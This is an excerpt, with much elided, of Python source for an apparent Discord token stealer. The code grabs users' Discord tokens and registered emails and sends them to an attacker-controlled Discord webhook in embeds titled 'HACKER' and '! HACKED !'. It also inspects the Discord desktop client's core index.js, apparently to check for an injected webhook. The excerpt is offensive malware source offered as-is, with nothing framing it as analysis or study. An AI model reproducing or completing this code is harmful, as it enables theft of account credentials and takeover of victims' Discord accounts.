...
from Crypto.Cipher import AES #! UPGRADED TO PYCRYTODOME CYZ CRYPTO NO LONGER MAINTENED !
...
def main(webhook_url):
	...
	# upgrading webhook method cuz why not
	webhook = SyncWebhook.from_url(webhook_url)
	embed = Embed(title="HACKER", color=15535980)
	...
	embed.set_footer(text="hacker bot the genuis")
	...
	webhook.send(content="||@here||", embed=embed, file=file,)
	# avatar_url="https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg", username="Pegasus"
...
class grabtokens():
	...
	def grabTokens(self):
		...
		for token in self.tokens:
			...
			#embed.add_field(name=f"🔷 User : {username}")
			
			embed.add_field(name="field", value=f"discord token: {token}, discord registred email : {email}", inline=False)

			#embed.add_field(name="field46",value=f"```{token}```\n\n**Email:** `{email}`\n**Phone:** `{phone}`\n**Nitro:** `{nitro}`\n**Methods:** `{method}`",inline=False)

			#embed.add_field(name=f"🔷  User: `{username}`", value=f"```{token}```\n\n**Email:** `{email}`\n**Phone:** `{phone}`\n**Nitro:** `{nitro}`\n**Methods:** `{method}`", inline=False)
	...
	if os.path.exists(appdata+'\\discord'):
		with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'r', encoding="utf-8") as indexFile:
			...
			if webhook_url in index:
				#webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
				webhook = SyncWebhook.from_url(webhook_url)
				embed = Embed(title="! HACKED !", color=15535980)


				embed.set_footer(text="HACKED BY ME")
				embed.set_thumbnail(url="https://images-ext-2.discordapp.net/external/8_XRBxiJdDcKXyUMqNwDiAtIb8lt70DaUHRiUd_bsf4/https/i.imgur.com/q1NJvOx.png")
